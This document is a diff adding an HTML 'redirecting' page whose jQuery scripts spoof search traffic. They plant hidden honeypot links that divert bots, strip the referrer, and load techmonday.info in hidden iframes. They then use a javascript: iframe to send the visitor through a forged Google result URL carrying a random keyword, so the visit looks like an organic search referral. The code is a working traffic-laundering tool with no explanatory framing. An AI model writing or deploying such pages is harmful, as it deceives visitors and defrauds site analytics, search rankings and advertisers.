@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+	<meta name="referrer" content="no-referrer">
+    <meta charset="UTF-8">
+    <script src="https://code.jquery.com/jquery-3.4.1.min.js" type="text/javascript"></script>
+    <script type="text/javascript">
+        (function () {
+
+            $( window ).on( "userblocked", function( event, validationresult ) {
+                window.location.href = validationresult.redirectUri;
+            });
+            
+        })();
+    </script>
+        
+<script type="text/javascript">
+$( window ).on( "uservalidated", function( event, validationresult ) {
+  $('body h1').html('Redirecting');
+ 
+var keywords = [ "WordPress Hosting", "Techmonday", "What is CRM", "Virtual Dedicated Server", "wireless internet provider" ];
+
+  var availableUrls = [
+	  "http://www.google.com/url?q=##KEYWORD##&source=web&cd=1&esrc=s&sa=t&rct=j&url=https%3A%2F%2Ftechmonday.info%2F&ved=2ahUKEwjn1PrtjPfmAhWJA2MBHWlWA6oQFjAAegQIAhAB&usg=AOvVaw2lHTpsNbqd16fNfKjOVsQ_",
+	  "http://www.google.com/url?q=##KEYWORD##&source=web&cd=1&esrc=s&sa=t&rct=j&url=https%3A%2F%2Ftechmonday.info%2F&ved=2ahUKEwjn1PrtjPfmAhWJA2MBHWlWA6oQFjAAegQIAhAB&usg=AOvVaw2lHTpsNbqd16fNfKjOVsQ_",
+	  "http://www.google.com/url?q=##KEYWORD##&source=web&cd=1&esrc=s&sa=t&rct=j&url=https%3A%2F%2Ftechmonday.info%2F&ved=2ahUKEwjn1PrtjPfmAhWJA2MBHWlWA6oQFjAAegQIAhAB&usg=AOvVaw2lHTpsNbqd16fNfKjOVsQ_",
+	  "http://www.google.com/url?q=##KEYWORD##&source=web&cd=1&esrc=s&sa=t&rct=j&url=https%3A%2F%2Ftechmonday.info%2F&ved=2ahUKEwjn1PrtjPfmAhWJA2MBHWlWA6oQFjAAegQIAhAB&usg=AOvVaw2lHTpsNbqd16fNfKjOVsQ_",
+	  "http://www.google.com/url?q=##KEYWORD##&source=web&cd=1&esrc=s&sa=t&rct=j&url=https%3A%2F%2Ftechmonday.info%2F&ved=2ahUKEwjn1PrtjPfmAhWJA2MBHWlWA6oQFjAAegQIAhAB&usg=AOvVaw2lHTpsNbqd16fNfKjOVsQ_"
+  ];
+  
+  var $toUrl = availableUrls[Math.floor(Math.random() * availableUrls.length)];
+ 
+  $('iframe#container').on('load', function() {
+  	  var randKeyword = keywords[Math.floor(Math.random() * keywords.length)].replace(' ', '+');
+      var redirectUri = $toUrl.replace('##KEYWORD##', randKeyword);
+      $('body').append("<iframe style=\"display:none\" src=\"javascript:parent.location.replace('"+ redirectUri +"'+(parent.location.hash||''))\" />");
+   });
+  
+   $('iframe').attr('src', 'http://techmonday.info/');
+});
+
+</script>
+
+    <script type="text/javascript">
+
+    (function() {
+
+        $(document).ready(function() {
+            var $links = ["<a href=\"#\" class=\"some-blog-post.php?id=smith\">Will Will Smith Smith<\/a>","<a href=\"#\" class=\"some-blog-post.php?id=pizza\">The best pizzas around the globe<\/a>","<a href=\"#\" class=\"some-blog-post.php?id=mac\">Tired of MacDonalds?<\/a>"];
+
+            // Append all links
+            $.each($links, function (k, v) {
+                var $link = $($.parseHTML( v )).addClass('bleep').css({
+                    'display': "none"
+                });
+                $('body').append($link);
+            });
+
+            $(document).on('click', 'a.bleep', function( event ) {
+                event.preventDefault();
+                $(window).trigger("userblocked", {redirectUri: 'some-blog-post.php?id=app'});
+            });
+
+        });
+
+        setTimeout( function() {
+            $(window).trigger('uservalidated', {
+                redirectUri: "http://techmonday.info/"
+            });
+        }, 1000 );
+
+    })();
+</script>
+</head>
+<body style="overflow:hidden;">
+    
+<h1>Please wait while we are redirecting you!</h1>
+<iframe id="container" refererpolicy="no-referer" style="display:none;visibility:hidden" />
+
+</body>
+</html>
